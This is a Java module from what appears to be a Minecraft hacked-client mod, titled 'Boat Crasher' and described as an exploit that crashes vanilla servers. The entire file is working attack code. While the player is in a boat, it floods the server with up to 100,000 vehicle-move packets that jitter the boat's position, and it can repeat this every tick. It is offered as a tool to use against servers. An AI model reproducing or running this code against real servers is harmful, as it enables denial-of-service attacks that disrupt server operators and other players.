package me.darragh.eamfhc.module.impl.exploit;

import me.darragh.eamfhc.event.impl.game.EventLevelUnload;
import me.darragh.eamfhc.event.impl.player.EventPlayerPostTick;
import me.darragh.eamfhc.feature.property.PropertyFactory;
import me.darragh.eamfhc.feature.property.PropertyMetadata;
import me.darragh.eamfhc.feature.property.constraints.NumberPropertyConstraints;
import me.darragh.eamfhc.feature.property.type.BooleanProperty;
import me.darragh.eamfhc.feature.property.type.number.IntegerProperty;
import me.darragh.eamfhc.module.Module;
import me.darragh.eamfhc.module.ModuleIdentifier;
import me.darragh.eamfhc.module.ModuleType;
import me.darragh.eamfhc.util.ChatUtil;
import me.darragh.eamfhc.util.PacketUtil;
import me.darragh.event.bus.Listener;
import net.minecraft.network.protocol.game.ServerboundMoveVehiclePacket;
import net.minecraft.world.entity.Entity;
import net.minecraft.world.entity.vehicle.Boat;

@ModuleIdentifier(
        identifier = "boat-crasher",
        displayName = "Boat Crasher",
        description = "Weird exploit that crashes vanilla servers by Coderx-Gamer",
        type = ModuleType.EXPLOIT
)
public class BoatCrasherModule extends Module {
    private final BooleanProperty constant = PropertyFactory.booleanPropertyBuilder(this)
            .metadata(new PropertyMetadata("constant", "Constant"))
            .defaultValue(false)
            .build();

    private final IntegerProperty repeat = PropertyFactory.integerPropertyBuilder(this)
            .metadata(new PropertyMetadata("repeat", "Repeat"))
            .constraints(new NumberPropertyConstraints<>(1000, 100000, 1000))
            .defaultValue(100000)
            .build();

    private final IntegerProperty offsetX = PropertyFactory.integerPropertyBuilder(this)
            .metadata(new PropertyMetadata("offset-x", "Offset x"))
            .constraints(new NumberPropertyConstraints<>(1, 5, 1))
            .defaultValue(3)
            .build();

    private final IntegerProperty offsetY = PropertyFactory.integerPropertyBuilder(this)
            .metadata(new PropertyMetadata("offset-y", "Offset y"))
            .constraints(new NumberPropertyConstraints<>(1, 5, 1))
            .defaultValue(3)
            .build();

    private final IntegerProperty offsetZ = PropertyFactory.integerPropertyBuilder(this)
            .metadata(new PropertyMetadata("offset-z", "Offset z"))
            .constraints(new NumberPropertyConstraints<>(1, 5, 1))
            .defaultValue(3)
            .build();

    @Override
    protected void onEnable() {
        super.onEnable();
        if (minecraft.player == null) { // wtf
            this.disable();
            return;
        }

        this.attemptCrash();
    }

    @Listener
    public void onLevelUnload(EventLevelUnload event) {
        this.disable();
    }

    @Listener
    public void onPlayerPostTick(EventPlayerPostTick event) {
        if (minecraft.player == null || minecraft.level == null) {
            ChatUtil.printMessage("Invalid world state.");
            this.disable();
            return;
        }

        if (this.constant.getValue()) {
            this.attemptCrash();
            return;
        }

        Entity vehicle = minecraft.player.getVehicle();
        if (!(vehicle instanceof Boat)) {
            ChatUtil.printMessage("You must remain in a boat to crash the server!");
            this.disable();
        }
    }

    private void attemptCrash() {
        assert minecraft.player != null; // it won't be null lol
        Entity vehicle = minecraft.player.getVehicle();
        if (!(vehicle instanceof Boat)) {
            ChatUtil.printMessage("You must be in a boat to crash the server!");
            this.disable();
            return;
        }

        for (int i = 0; i < repeat.getValue(); i++) {
            // Track previous position
            double prevX = vehicle.getX(),
                    prevY = vehicle.getY(),
                    prevZ = vehicle.getZ();

            // Spam to random values
            vehicle.setPos(
                    prevX - offsetX.getValue(),
                    prevY - offsetY.getValue(),
                    prevZ - offsetZ.getValue()
            );
            PacketUtil.sendPacket(new ServerboundMoveVehiclePacket(vehicle));

            // Reset values
            vehicle.setPos(prevX, prevY, prevZ);
            PacketUtil.sendPacket(new ServerboundMoveVehiclePacket(vehicle));
        }
    }
}
